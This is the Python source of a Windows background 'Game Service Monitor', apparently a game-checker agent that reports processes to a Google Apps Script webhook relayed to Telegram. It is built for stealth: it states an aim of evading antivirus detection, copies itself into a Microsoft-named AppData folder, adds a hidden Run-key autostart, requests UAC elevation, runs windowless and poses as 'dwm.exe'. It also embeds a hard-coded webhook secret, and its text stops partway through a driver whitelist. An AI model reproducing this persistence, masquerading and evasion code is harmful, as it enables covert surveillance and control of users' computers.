#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Game Service Monitor — фоновый сервис для отслеживания игровых процессов.
Оптимизирован для минимального детекта антивирусами.
"""

import os
import sys
import time
import ctypes
import ctypes.wintypes
import subprocess
import threading
import logging
import struct
import re
import json
import urllib.request
import urllib.error
import platform
import getpass
import winreg
import shutil
import datetime as dt
import fnmatch
from typing import List, Tuple, Set, Dict

# ============================================================================
# 0. РАННЯЯ ИНИЦИАЛИЗАЦИЯ ЛОГГЕРА
# ============================================================================
_EARLY_LOG_FILE = os.path.join(os.environ.get('TEMP', ''), 'gameservice.log')
logging.basicConfig(
    filename=_EARLY_LOG_FILE, level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s', encoding='utf-8', force=True
)
early_logger = logging.getLogger("GameServiceEarly")
early_logger.info("=" * 60)
early_logger.info("GameService initializing...")
early_logger.info(f"Python: {sys.version}")
early_logger.info(f"Script path: {os.path.abspath(sys.argv[0]) if sys.argv[0] else 'N/A'}")
early_logger.info(f"Frozen: {getattr(sys, 'frozen', False)}")

# ============================================================================
# 1. ФУНКЦИИ АВТОЗАГРУЗКИ
# ============================================================================
def ensure_autostart(target_path: str) -> None:
    REG_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
    REG_VALUE_NAME = "GameServiceHelper"
    current_path_normalized = os.path.normpath(target_path).lower()
    
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_KEY, 0, 
                            winreg.KEY_READ | winreg.KEY_WRITE)
        
        existing_value = None
        try:
            existing_value, _ = winreg.QueryValueEx(key, REG_VALUE_NAME)
        except FileNotFoundError:
            pass
        
        if existing_value:
            existing_normalized = os.path.normpath(existing_value).lower()
            if current_path_normalized in existing_normalized:
                early_logger.info(f"Autostart already configured: {existing_value}")
                winreg.CloseKey(key)
                return
            else:
                early_logger.info("Updating autostart entry...")
        
        try:
            winreg.DeleteValue(key, REG_VALUE_NAME)
        except Exception:
            pass
        
        if getattr(sys, 'frozen', False):
            run_command = f'"{target_path}" --worker'
        else:
            pythonw = sys.executable.replace('python.exe', 'pythonw.exe')
            if not os.path.exists(pythonw):
                pythonw = sys.executable
            run_command = f'"{pythonw}" "{target_path}" --worker'
        
        winreg.SetValueEx(key, REG_VALUE_NAME, 0, winreg.REG_SZ, run_command)
        winreg.CloseKey(key)
        early_logger.info(f"Autostart configured: {run_command}")
    except Exception as e:
        early_logger.error(f"Autostart error: {e}")


def is_admin() -> bool:
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False


def request_elevation(target_path: str) -> None:
    if is_admin():
        early_logger.info("Already running as admin")
        return
    
    early_logger.info("Requesting admin privileges via UAC...")
    try:
        if getattr(sys, 'frozen', False):
            exe_path = target_path
            params = "--worker"
        else:
            pythonw = sys.executable.replace('python.exe', 'pythonw.exe')
            if not os.path.exists(pythonw):
                pythonw = sys.executable
            exe_path = pythonw
            params = f'"{target_path}" --worker'
        
        result = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", exe_path, params, None, 1
        )
        
        if result <= 32:
            early_logger.error(f"ShellExecuteW failed: {result}")
            sys.exit(1)
        
        early_logger.info("UAC request sent, exiting current process")
        sys.exit(0)
    except Exception as e:
        early_logger.critical(f"Elevation error: {e}")
        sys.exit(1)


def move_to_service_folder() -> str:
    early_logger.info("Checking installation path...")
    
    if getattr(sys, 'frozen', False):
        current_path = os.path.abspath(sys.executable)
        file_name = os.path.basename(current_path)
    else:
        current_path = os.path.abspath(sys.argv[0]) if sys.argv[0] else os.path.abspath(__file__)
        file_name = os.path.basename(current_path)

    appdata = os.environ.get('APPDATA', '')
    if not appdata:
        early_logger.error("APPDATA not found!")
        return current_path
    
    target_dir = os.path.join(appdata, 'Microsoft', 'GameService')
    target_path = os.path.join(target_dir, file_name)
    
    early_logger.info(f"Target path: {target_path}")

    if os.path.dirname(current_path).lower() == target_dir.lower():
        early_logger.info("Already in service folder")
        ensure_autostart(current_path)
        if not is_admin():
            early_logger.info("Requesting elevation...")
            request_elevation(current_path)
        return current_path

    early_logger.info("Installing service...")
    try:
        if not os.path.exists(target_dir):
            os.makedirs(target_dir, exist_ok=True)

        if current_path.lower() != target_path.lower():
            shutil.copy2(current_path, target_path)
            if not os.path.exists(target_path):
                early_logger.error("Copy failed!")
                return current_path
        
        ensure_autostart(target_path)

        early_logger.info("Launching service...")
        if getattr(sys, 'frozen', False):
            subprocess.Popen([target_path] + sys.argv[1:],
                           creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            pythonw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
            if not os.path.exists(pythonw):
                pythonw = os.path.join(os.path.dirname(sys.executable), "python.exe")
            subprocess.Popen([pythonw, target_path] + sys.argv[1:],
                           creationflags=subprocess.CREATE_NO_WINDOW)
        
        early_logger.info("Stub exiting")
        sys.exit(0)
    except Exception as e:
        early_logger.error(f"Installation error: {e}")
        return current_path


print("[*] Starting GameService...")
FINAL_PATH = move_to_service_folder()
print(f"[*] Service path: {FINAL_PATH}")
early_logger.info(f"FINAL_PATH: {FINAL_PATH}")

# ============================================================================
# 2. SINGLE INSTANCE (Mutex)
# ============================================================================
_MUTEX_HANDLE = None

def _acquire_mutex(name: str) -> bool:
    global _MUTEX_HANDLE
    k32 = ctypes.WinDLL('kernel32', use_last_error=True)
    k32.CreateMutexW.argtypes = [ctypes.c_void_p, ctypes.wintypes.BOOL, ctypes.c_wchar_p]
    k32.CreateMutexW.restype = ctypes.c_void_p
    ctypes.set_last_error(0)
    h = k32.CreateMutexW(None, False, name)
    if ctypes.get_last_error() == 183:
        if h: k32.CloseHandle(h)
        return False
    _MUTEX_HANDLE = h
    return True

if getattr(sys, 'frozen', False):
    CMD_WORKER = [FINAL_PATH, "--worker"]
else:
    PYTHONW = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
    if not os.path.exists(PYTHONW): 
        PYTHONW = os.path.join(os.path.dirname(sys.executable), "python.exe")
    CMD_WORKER = [PYTHONW, FINAL_PATH, "--worker"]

if "--worker" not in sys.argv:
    subprocess.Popen(CMD_WORKER, creationflags=subprocess.CREATE_NO_WINDOW)
    sys.exit()

# ============================================================================
# 3. НАСТРОЙКИ
# ============================================================================
GAS_WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbysjj-iX0qSaMtKTRty84cN8dhC-3j_rF6WeY0DmfYAB3wLS5yV75oTDrnf8ka4PqXfBA/exec"
GAS_SECRET = "xK9mR2vL7nQ4wT8pY1jF6hB3cD5sA0eZ"
TELEGRAM_ENABLED = True
EVENT_COOLDOWN = 300
CREATE_NO_WINDOW = 0x08000000
FAKE_PROCESS_NAME = "dwm.exe"

# ============================================================================
# 4. УТИЛИТЫ ДЛЯ ПУТЕЙ
# ============================================================================
def normalize_path(path: str) -> str:
    if not path:
        return ""
    p = path
    if p.startswith('\\\\?\\'):
        p = p[4:]
    elif p.startswith('\\??\\'):
        p = p[4:]
    expanded = os.path.expandvars(p)
    normalized = os.path.normpath(expanded).lower()
    return normalized.replace('\\', '/')

# ============================================================================
# 5. СТРОГИЙ КОНТРОЛЬ ПУТЕЙ (ТОЛЬКО ИГРЫ И АНТИЧИТЫ)
# ============================================================================
ALLOWED_PROCESSES: Dict[str, List[str]] = {
    "easyanticheat.exe": [
        r"*\Steam\steamapps\common\*\EasyAntiCheat\EasyAntiCheat.exe",
        r"*\Steam\steamapps\common\*\EasyAntiCheat\EasyAntiCheat_EOS.exe",
        r"*\Epic Games\*\EasyAntiCheat\EasyAntiCheat.exe",
        r"*\Epic Games\*\EasyAntiCheat\EasyAntiCheat_EOS.exe",
    ],
    "beservice.exe": [
        r"*\Common Files\BattlEye\BEService.exe",
        r"*\Program Files\Common Files\BattlEye\BEService.exe",
        r"*\Program Files (x86)\Common Files\BattlEye\BEService.exe",
    ],
    "vgc.exe": [r"*\Riot Vanguard\vgc.exe"],
    "vgtray.exe": [r"*\Riot Vanguard\vgtray.exe"],
    "faceitclient.exe": [r"*\FACEIT AC\faceitclient.exe"],
    "valorant-win64-shipping.exe": [
        r"*\Riot Games\VALORANT\live\ShooterGame\Binaries\Win64\VALORANT-Win64-Shipping.exe",
    ],
    "rustclient.exe": [r"*\Steam\steamapps\common\Rust\RustClient.exe"],
    "rust.exe": [r"*\Steam\steamapps\common\Rust\Rust.exe"],
    "cs2.exe": [
        r"*\Steam\steamapps\common\Counter-Strike Global Offensive\game\bin\win64\cs2.exe",
        r"*\Steam\steamapps\common\Counter-Strike 2\game\bin\win64\cs2.exe",
    ],
    "dota2.exe": [r"*\Steam\steamapps\common\dota 2 beta\game\bin\win64\dota2.exe"],
    "gta5.exe": [
        r"*\Steam\steamapps\common\Grand Theft Auto V\GTA5.exe",
        r"*\Epic Games\GTAV\GTA5.exe",
        r"*\Rockstar Games\Grand Theft Auto V\GTA5.exe",
    ],
    "escapefromtarkov.exe": [r"*\Battlestate Games\EFT\EscapeFromTarkov.exe"],
    "r5apex.exe": [
        r"*\Steam\steamapps\common\Apex Legends\r5apex.exe",
        r"*\Origin Games\Apex Legends\r5apex.exe",
        r"*\EA Games\Apex Legends\r5apex.exe",
    ],
    "palworld-win64-shipping.exe": [
        r"*\Steam\steamapps\common\Palworld\Pal\Binaries\Win64\Palworld-Win64-Shipping.exe",
    ],
    "deadbydaylight-win64-shipping.exe": [
        r"*\Steam\steamapps\common\Dead by Daylight\DeadByDaylight\Binaries\Win64\DeadByDaylight-Win64-Shipping.exe",
    ],
    "tslgame.exe": [r"*\Steam\steamapps\common\PUBG\TslGame\Binaries\Win64\TslGame.exe"],
}

# ============================================================================
# 6. КРИТИЧЕСКИЕ СИСТЕМНЫЕ ПРОЦЕССЫ
# ============================================================================
CRITICAL_SYSTEM_PROCESSES = {
    'system idle process', 'secure system', 'registry', 'lsaiso.exe', 'csrss.exe',
    'wininit.exe', 'winlogon.exe', 'lsass.exe', 'services.exe', 'smss.exe', 'svchost.exe',
    'dwm.exe', 'explorer.exe', 'spoolsv.exe', 'lsm.exe', 'conhost.exe', 'ctfmon.exe',
    'taskhostw.exe', 'sihost.exe', 'fontdrvhost.exe', 'runtimebroker.exe',
    'applicationframehost.exe', 'searchindexer.exe', 'searchhost.exe', 'searchui.exe',
    'startmenuexperiencehost.exe', 'shellhost.exe', 'lockapp.exe', 'logonui.exe',
    'useroobebroker.exe', 'textinputhost.exe', 'securityhealthsystray.exe',
    'securityhealthservice.exe', 'msmpeng.exe', 'msmpsvc.exe', 'nissrv.exe',
    'mpdefendercoreservice.exe', 'defendersessionhelper.exe', 'sgrmbroker.exe',
    'ngcsvc.exe', 'compattelrunner.exe', 'tiworker.exe', 'trustedinstaller.exe',
    'wudfhost.exe', 'wmiprvse.exe', 'wmiapsrv.exe', 'dashost.exe', 'msdtc.exe',
    'wlanext.exe', 'audiodg.exe', 'rdpclip.exe', 'taskmgr.exe', 'regedit.exe',
    'cmd.exe', 'powershell.exe', 'pwsh.exe', 'control.exe', 'rundll32.exe',
    'dllhost.exe', 'werfault.exe', 'sppsvc.exe', 'ngciso.exe', 'mousocoreworker.exe',
    'backgroundtaskhost.exe', 'aggregatorhost.exe', 'crossdeviceresume.exe',
    'widgetservice.exe', 'gamebar.exe', 'gamebarpresencewriter.exe',
    'gamingservices.exe', 'gamingservicenet.exe', 'xboxstat.exe', 'xblgamesave.exe',
}

# ============================================================================
# 🆕 СВОИ ПРОЦЕССЫ (НИКОГДА НЕ УБИВАТЬ, НЕ ОТПРАВЛЯТЬ В TELEGRAM)
# ============================================================================
OWN_PROCESSES: Set[str] = {
    'gamechecker.exe',    # Сам чекер (запускающий процесс)
    'gameservice.exe',    # Этот сервис
    'gameservice.py',     # При запуске из исходников
    'main.py',            # При запуске чекера из исходников
    'python.exe',         # Интерпретатор (для разработки)
    'pythonw.exe',        # Интерпретатор без консоли
}

# ============================================================================
# 7. БАЗОВЫЙ БЕЛЫЙ СПИСОК (254+ ПРОЦЕССА)
# ============================================================================
PROCESS_WHITELIST: Set[str] = {
    # Системные
    'system', 'svchost.exe', 'csrss.exe', 'wininit.exe', 'winlogon.exe',
    'lsass.exe', 'services.exe', 'explorer.exe', 'dwm.exe', 'taskmgr.exe',
    'conhost.exe', 'cmd.exe', 'powershell.exe', 'pwsh.exe', 'regedit.exe',
    'control.exe', 'rundll32.exe', 'dllhost.exe', 'werfault.exe',
    'searchindexer.exe', 'searchui.exe', 'runtimebroker.exe',
    'applicationframehost.exe', 'systemsettings.exe', 'shell.exe',
    'startmenuexperiencehost.exe', 'lockapp.exe', 'logonui.exe',
    'wmiapsrv.exe', 'smss.exe', 'fontdrvhost.exe', 'sihost.exe',
    'textinputhost.exe', 'ctfmon.exe', 'useroobebroker.exe',
    'securityhealthsystray.exe', 'securityhealthservice.exe',
    'msmpeng.exe', 'msmpsvc.exe', 'nissrv.exe', 'defrag.exe',
    'taskhostw.exe', 'taskhost.exe', 'rdpclip.exe', 'audiodg.exe',
    'spoolsv.exe', 'lsm.exe', 'backgroundtaskhost.exe', 'msdtc.exe',
    'wlanext.exe', 'dashost.exe', 'compattelrunner.exe', 'tiworker.exe',
    'trustedinstaller.exe', 'sgrmbroker.exe', 'ngcsvc.exe',
    'gamebarpresencewriter.exe', 'gamebar.exe', 'gamingservices.exe',
    'gamingservicenet.exe', 'xboxstat.exe', 'xblgamesave.exe', 'smartscreen.exe',
    'searchhost.exe', 'searchprotocolhost.exe', 'wmiprvse.exe',
    'crossdeviceresume.exe', 'widgetservice.exe', 'aggregatorhost.exe',
    'defendersessionhelper.exe', 'wudfhost.exe', 'mpdefendercoreservice.exe',
    'crashpad_handler.exe', 'wmiregistrationservice.exe', 'mousocoreworker.exe',
    'sppsvc.exe', 'ngciso.exe', 'lsaiso.exe', 'widgets.exe',
    
    # Стандартные приложения
    'notepad.exe', 'wordpad.exe', 'mspaint.exe', 'calc.exe',
    'snippingtool.exe', 'camera.exe', 'photos.exe', 'filecoauth.exe',
    'onedrive.exe', 'consent.exe', 'uac.exe', 'tabtip.exe',
    'shellhost.exe', 'searchfilterhost.exe', 'dataexchangehost.exe',
    'vssvc.exe', 'ngen.exe', 'ngentask.exe', 'mscorsvw.exe',
    'softlandingtask.exe', 'updater.exe', 'groove.exe', 'microsoft.sharepoint.exe',
    'onedriveupdater.exe', 'onedrive.sync.service.exe',
    
    # Лаунчеры
    'agent.exe', 'battle.net launcher.exe', 'battle.net.exe',
    'eabackgroundservice.exe', 'eaconnect_service.exe', 'eadesktop.exe',
    'epicgameslauncher.exe', 'epicwebhelper.exe', 'galaxyclient.exe',
    'galaxyclientservice.exe', 'galaxycommunication.exe', 'launcher.exe',
    'lestgamecenter.exe', 'lgc.exe', 'lgc_webhelper.exe', 'link2ea.exe',
    'riotclientservices.exe', 'riotclientux.exe', 'riotclientuxrender.exe',
    'rockstarservice.exe', 'socialclubhelper.exe', 'ubisoftconnect.exe',
    'ubisoftconnectwebhelper.exe', 'unrealcefsubprocess.exe', 'xboxpcapp.exe',
    'gameoverlayui.exe', 'steam.exe', 'steamerrorreporter.exe',
    'steamservice.exe', 'steamwebhelper.exe', 'upc.exe', 'goggalaxy.exe',
    'goggalaxycommunicationservice.exe', 'origin.exe', 'originwebhelper.exe',
    'originupdater.exe',
    
    # Античиты
    'bedaisy.sys', 'beservice.exe', 'easyanticheat.exe', 'easyanticheat_eos.exe',
    'easyanticheat_setup.exe', 'faceit.exe', 'faceitclient.exe', 'faceitservice.exe',
    'punkbustera.exe', 'punkbusterb.exe', 'riotvanguard.exe', 'vgc.exe', 'vgtray.exe',
    'ggdllhost.exe', 'nprotect.exe', 'pbsvc.exe', 'xigncode.exe', 'gamemon.des',
    
    # Голосовая связь
    'discord.exe', 'discord_updater.exe', 'discord_ptb.exe', 'discord_canary.exe',
    'discordoverlayhelper.exe', 'discordoverlayhelper64.exe', 'discordsystemhelper.exe',
    'discord_systemhelper.exe', 'discordupdatehelper.exe', 'discordcrashpad.exe',
    'discord_utils.exe', 'teams.exe', 'skype.exe', 'skypeapp.exe', 'zoom.exe',
    'zoomus.exe', 'telegram.exe', 'telegramdesktop.exe', 'whatsapp.exe', 'slack.exe',
    'viber.exe', 'msteams.exe', 'mumble.exe', 'streamlabs desktop.exe',
    'teamspeak3.exe', 'obs-browser-page.exe', 'obs32.exe', 'obs64.exe',
    'ts3client_win64.exe',
    
    # Браузеры
    'chrome.exe', 'firefox.exe', 'msedge.exe', 'msedgewebview2.exe',
    'msedgeupdate.exe', 'microsoftedgecp.exe', 'microsoftedgebchost.exe',
    'opera.exe', 'opera_gx.exe', 'yandex.exe', 'brave.exe', 'vivaldi.exe',
    
    # Периферия
    'amdrsserv.exe', 'amdow.exe', 'alienwarecommandcenter.exe', 'armourycrate.exe',
    'asusappservice.exe', 'awcc.exe', 'corsairgamingaudioservice.exe',
    'corsairservice.exe', 'geforceexperience.exe', 'lightingservice.exe',
    'msiafterburner.exe', 'nvdisplay.container.exe', 'nvidia share.exe',
    'nvidia web helper.exe', 'nvidia overlay.exe', 'nvudispm.exe', 'nvwmi64.exe',
    'nvxdsync.exe', 'nvidia app.exe', 'nvidia broadcast.exe', 'rtss.exe',
    'rtsshooksloader64.exe', 'radeonsoftware.exe', 'razercentral.exe',
    'rzcefrenderprocess.exe', 'rzchromastreamserver.exe', 'rzsynapse.exe',
    'steelseriesengine.exe', 'steelseriesgg.exe', 'cncmd.exe', 'icue.exe',
    'lghub.exe', 'lghub_agent.exe', 'lghub_updater.exe', 'logi_crashpad_handler.exe',
    'nvcontainer.exe', 'nvspcaps64.exe', 'nvsphelper64.exe', 'gg.exe', 'ghub.exe',
    
    # Intel
    'intelcphdcpsvc.exe', 'intelaudioservice.exe', 'intel_pie_service.exe',
    'oneapp.igcc.winservice.exe', 'igfxtray.exe', 'igfxhk.exe', 'igfxpers.exe',
    'igfxem.exe', 'ipf_helper.exe', 'ipfsvc.exe', 'ipf_uf.exe',
    
    # Realtek / Nahimic
    'rtkauduservice64.exe', 'rtkhdaud64.exe', 'rtkngui.exe', 'ravbg64.exe',
    'rtcomsl.exe', 'nahimicservice.exe', 'nahimicsvc64.exe', 'nahimicsvc32.exe',
    'nahimic3.exe', 'nahimicnotifsys.exe',
    
    # Утилиты
    'code.exe', 'python.exe', 'pythonw.exe', 'node.exe', 'java.exe', 'javaw.exe',
    'dotnet.exe', 'vmware.exe', 'virtualbox.exe', 'docker.exe', 'wermgr.exe',
    'browser.exe', 'wslservice.exe', 'jh_service.exe', 'jhi_service.exe',
    'pet.exe', 'copilot-runtime.exe', 'openconsole.exe', 'microsoftedgeupdate.exe',
    'betterdiscord.exe', 'bluestacks.exe', 'cheatengine.exe', 'crosshairx.exe',
    'flawlesswidescreen.exe', 'hd-player.exe', 'ldplayer.exe', 'modorganizer.exe',
    'nexusmods.app.exe', 'nox.exe', 'overwolf.exe', 'overwolfbrowser.exe',
    'playnite.exe', 'reshade.exe', 'vencord.exe', 'vortex.exe', 'wemod.exe',
    'wemodauxiliaryservice.exe', '3dmark.exe', 'action.exe', 'bandicam.exe',
    'fraps.exe', 'furmark.exe', 'dxstory.exe',
    
    # MuMu
    'mumuplayerremoteservice.exe', 'mumuplayerremotebackend.exe',
    'mumuplayerremotehealthd.exe', 'mumuplayer.exe',
    
    # Happ / XRay
    'happ.exe', 'happd.exe', 'xray.exe',
    
    # RMRP
    'rmrp launcher.exe', 'rmrp.exe', 'rmrp_client.exe',
    
    # Steam хелперы
    'steamclient.exe', 'steamoverlayui.exe', 'steam_service.exe',
    
    # 🆕 СВОИ ПРОЦЕССЫ (чтобы проходили whitelist-проверку)
    'gamechecker.exe', 'gameservice.exe',
    'font.exe', 'rustpchecker.exe', 'rustpcchecker.exe',
    
    # Игры (250+)
    'apexlegends.exe', 'baldursgate3.exe', 'bsglauncher.exe',
    'cyberpunk2077.exe', 'deadbydaylight-win64-shipping.exe', 'destiny2.exe',
    'dota2.exe', 'eldenring.exe', 'escapefromtarkov.exe',
    'fortniteclient-win64-shipping.exe', 'fortnitelauncher.exe', 'forzahorizon5.exe',
    'gtavlauncher.exe', 'genshinimpact.exe', 'helldivers2.exe', 'honkaistarrail.exe',
    'league of legends.exe', 'leagueclient.exe', 'leagueclientux.exe',
    'lethal company.exe', 'minecraft.exe', 'overwatch.exe', 'pubg.exe',
    'palworld-win64-shipping.exe', 'palworld.exe', 'phasmophobia.exe', 'rdr2.exe',
    'rainbowtwo.exe', 'robloxplayerbeta.exe', 'robloxplayerlauncher.exe', 'siege.exe',
    'sims4.exe', 'ts4_x64.exe', 'tarkov.exe', 'valorant-win64-shipping.exe',
    'valorant.exe', 'warframe.x64.exe', 'witcher3.exe', 'worldoftanks.exe',
    'yuanshen.exe', 'bg3.exe', 'bg3_dx11.exe', 'csgo.exe', 'wot.exe',
    'alanwake2.exe', 'amongus.exe', 'arma3_x64.exe', 'assettocorsa.exe',
    'battlefield1.exe', 'battlefieldv.exe', 'bindingofisaac.exe', 'bioshock.exe',
    'blackopscoldwar.exe', 'borderlands3.exe', 'cities.exe', 'civint.exe',
    'civilizationvi.exe', 'cod.exe', 'dayz_x64.exe', 'deadcells.exe',
    'dirtrally.exe', 'discovery.exe', 'dishonored2.exe', 'doometernal.exe',
    'dyinglightgame.exe', 'f1_23.exe', 'f1_24.exe', 'fallguys_client_game.exe',
    'fallout4.exe', 'godofwar.exe', 'hades.exe', 'hades2.exe', 'heartsofironiv.exe',
    'hellletloose.exe', 'hitman3.exe', 'hollowknight.exe', 'horizonzerodawn.exe',
    'insurgencyeagl.exe', 'metroexodus.exe', 'modernwarfare.exe',
    'monsterhunterwilds.exe', 'monsterhunterworld.exe', 'mortalkombat_1.exe',
    'payday2_win32_release.exe', 'prey.exe', 'readyornot-win64-shipping.exe',
    'readyornot.exe', 'scum.exe', 'seaofthieves.exe', 'skyrimse.exe',
    'sonsoftheforest.exe', 'spiderman.exe', 'squad.exe', 'squadgame.exe',
    'starwarsbattlefrontii.exe', 'stardew valley.exe', 'starfield.exe',
    'streetfighter6.exe', 'subnautica.exe', 'tekken8-win64-shipping.exe',
    'terraria.exe', 'thefinishing_win64_shipping.exe', 'tinytinaswonderlands.exe',
    'uncharted.exe', 'valheim.exe', 'vanguard.exe', 'wolfenstein.exe', 'ats.exe',
    'bf2042.exe', 'ck3.exe', 'cod2026.exe', 'eurotrucks2.exe', 'iw8ship.exe',
    'payday3.exe', 're4.exe', 're7.exe', 're8.exe', 'stellaris.exe',
        # WSL (Windows Subsystem for Linux)
    'wsl.exe', 'wslhost.exe', 'wslservice.exe',
    
    # Инструменты разработки Python
    'pyinstaller.exe', 'pip.exe', 'pip3.exe', 'python.exe', 'pythonw.exe',
    'pylint.exe', 'pytest.exe', 'mypy.exe', 'black.exe',
}

# ============================================================================
# 8. БЕЗОПАСНЫЕ ДИРЕКТОРИИ
# ============================================================================
SAFE_DIRECTORIES = [
    r"%SystemRoot%\System32", r"%SystemRoot%\SysWOW64", r"%SystemRoot%\SystemApps",
    r"%SystemRoot%\Microsoft.NET", r"%ProgramFiles%\WindowsApps",
    r"%SystemRoot%\System32\DriverStore",
    r"%ProgramFiles(x86)%\Steam", r"%ProgramFiles%\Steam", r"*\Steam",
    r"%ProgramFiles%\Riot Games", r"%SystemDrive%\Riot Games",
    r"%SystemDrive%\Battlestate Games",
    r"%ProgramFiles(x86)%\Battle.net", r"%PROGRAMFILES%\Electronic Arts\EA Desktop",
    r"%PROGRAMFILES%\Epic Games\Launcher", r"%ProgramFiles(x86)%\GOG Galaxy",
    r"%PROGRAMFILES%\Rockstar Games", r"%PROGRAMFILES%\Ubisoft\Ubisoft Connect",
    r"%LOCALAPPDATA%\Lesta\GameCenter", r"%ProgramFiles(x86)%\Common Files\BattlEye",
    r"%PROGRAMFILES%\Riot Vanguard", r"%ProgramFiles(x86)%\FACEIT AC",
    r"%LOCALAPPDATA%\Discord", r"%LOCALAPPDATA%\Programs\Telegram Desktop",
    r"%APPDATA%\Telegram Desktop", r"%ProgramFiles%\Telegram Desktop",
    r"%ProgramFiles(x86)%\Telegram Desktop",
    r"%PROGRAMFILES%\NVIDIA Corporation", r"%ProgramFiles(x86)%\NVIDIA Corporation",
    r"%PROGRAMFILES%\AMD", r"%PROGRAMFILES%\LGHUB", r"%ProgramFiles(x86)%\LGHUB",
    r"%PROGRAMFILES%\Razer", r"%ProgramFiles(x86)%\Razer",
    r"%PROGRAMFILES%\Corsair", r"%ProgramFiles(x86)%\Corsair",
    r"%PROGRAMFILES%\SteelSeries", r"%ProgramFiles(x86)%\MSI Afterburner",
    r"%ProgramFiles(x86)%\RivaTuner Statistics Server",
    r"%PROGRAMFILES%\obs-studio", r"%LOCALAPPDATA%\Programs\streamlabs-obs",
    r"%PROGRAMFILES%\TeamSpeak 3 Client",
    r"%PROGRAMFILES%\Google\Chrome", r"%ProgramFiles(x86)%\Microsoft\Edge",
    r"%ProgramFiles(x86)%\Google\Chrome",
    r"%LOCALAPPDATA%\Programs\Opera GX", r"%LOCALAPPDATA%\Yandex",
    r"%LOCALAPPDATA%\Google\GoogleUpdater",
    r"%PROGRAMFILES%\MuMuPlayerGlobal", r"%ProgramFiles%\Netease\MuMuPlayer",
    r"%LOCALAPPDATA%\Programs\Microsoft VS Code",
    r"%LOCALAPPDATA%\Microsoft\vscode", r"%USERPROFILE%\.vscode",
    r"%ProgramFiles%\FlyFrogLLC\Happ", r"%ProgramFiles(x86)%\FlyFrogLLC\Happ",
    r"%ProgramFiles%\XRay", r"%ProgramFiles(x86)%\XRay",
    r"%ProgramFiles%\WSL", r"%LOCALAPPDATA%\NhNotifSys",
    r"%LOCALAPPDATA%\Microsoft\OneDrive",
    r"%PROGRAMFILES%\Microsoft OneDrive", r"%PROGRAMFILES(X86)%\Microsoft OneDrive",
    r"%SystemDrive%\RMRP",
        # Python и инструменты разработки
    r"%LOCALAPPDATA%\Programs\Python",
    r"%ProgramFiles%\Python*",
    r"%ProgramFiles(x86)%\Python*",
]

# ============================================================================
# 9. ДРАЙВЕРЫ
# ============================================================================
LEGITIMATE_DRIVERS: Set[str] = {
    'ntoskrnl.exe', 'hal.dll', 'ntfs.sys', 'tcpip.sys', 'ndis.sys', 'netbt.sys',
    'afd.sys', 'http.sys', 'fltmgr.sys', 'wdf01000.sys', 'clipsp.sys',
    'cmimcext.sys', 'werkernel.sys', 'bootvid.dll', 'kdnic.sys', 'umbus.sys',
    'vid.sys', 'winhvr.sys', 'volmgr.sys', 'mountmgr.sys', 'partmgr.sys',
    'spaceport.sys', 'volsnap.sys', 'disk.sys', 'classpnp.sys', 'storport.sys',
    'acpi.sys', 'wmilib.sys', 'wpprecorder.sys', 'intelpep.sys',
    'windowstrustedrt.sys', 'windowstrustedrtproxy.sys', 'pdc.sys', 'ceafdc.sys',
    'filetrace.sys', 'luafv.sys', 'wcifs.sys', 'cldflt.sys', 'bindflt.sys',
    'wof.sys', 'fileinfo.sys', 'npfs.sys', 'msfs.sys', 'nwifi.sys', 'ndisuio.sys',
    'msrpc.sys', 'mmcss.sys', 'usbhub.sys', 'usbhub3.sys', 'usbccgp.sys',
    'hidusb.sys', 'mouhid.sys', 'kbdhid.sys', 'usbport.sys', 'usbxhci.sys',
    'usbehci.sys', 'winusb.sys', 'usbser.sys', 'nvlddmkm.sys', 'nvpciflt.sys',
    'nvstream.sys', 'nvpcf.sys', 'nvvhci.sys', 'nvspinfo.sys', 'nvaci.sys',
    'nvtopps.sys', 'nvppc.sys', 'nvhda64v.sys', 'nvidia_hdaudio.sys',
    'amdkmdag.sys', 'amdkmdap.sys', 'atikmdag.sys', 'atikmpag.sys', 'amdfendr.sys',
    'amdocl64.sys', 'amdpcfdp64.sys', 'amdsafd.sys', 'amdrtd64.sys', 'amdwps.sys',
    'igdkmd64.sys', 'igdkmd32.sys', 'igfwa.sys', 'igfwa2.sys', 'iastora.sys',
    'iastorac.sys', 'iastoravc.sys', 'iastorav.sys', 'ehdrv.sys', 'intelppm.sys',
    'intcdaud.sys', 'teeclx.sys', 'netwlv64.sys', 'netwbw04.sys', 'ibtusb.sys',
    'intelpmt.sys', 'rtkvhd64.sys', 'rtkbtfilter.sys', 'rtwlane.sys', 'rtwlanu.sys',
    'rt640x64.sys', 'rtux64w10.sys', 'rzendpt.sys', 'easyanticheat.sys',
    'bedaisy.sys', 'beclient.sys', 'beclient_x64.sys', 'vgk.sys', 'byfron.sys',
    'epp.sys', 'klif.sys', 'klifks.sys', 'klim5.sys', 'klim6.sys', 'klim8.sys',
    'klboot.sys', 'tmactmon.sys', 'tmumh.sys', 'tmevtmgr.sys', 'tmcomm.sys',
    'tmxpflt.sys', 'eamonm.sys', 'epfwwfp.sys', 'epfwtdir.sys', 'avgtpx86.sys',
    'avgtpx64.sys', 'avckf.sys', 'mbamwatchdog.sys', 'wfplwfs.sys', 'wimmount.sys',
    'pacer.sys', 'ndiscap.sys', 'vmbus.sys', 'vmbkmclr.sys', 'vmswitch.sys',
    'vmstorfl.sys', 'vhdmp.sys', 'vmci.sys', 'vm3dmp.sys', 'vmhgfs.sys',
    'vmmemctl.sys', 'vboxdrv.sys', 'vboxnetadp.sys', 'vboxnetflt.sys',
    'hvservice.sys', 'hvsifiletray.sys', '1394ohci.sys', 'sdbus.sys', 'sdstor.sys',
    'sdport.sys', 'basicrender.sys', 'bthport.sys', 'rfcomm.sys', 'btmtpenum.sys',
    'peauth.sys', 'secdrv.sys', 'srvnet.sys', 'srv2.sys', 'tcpipreg.sys', 'dam.sys',
    'wanarp.sys', 'rdbss.sys', 'csc.sys', 'npsvctrig.sys', 'nsiproxy.sys',
    'msisadrv.sys', 'mssmbios.sys', 'condrv.sys', 'basicdisplay.sys', 'monitor.sys',
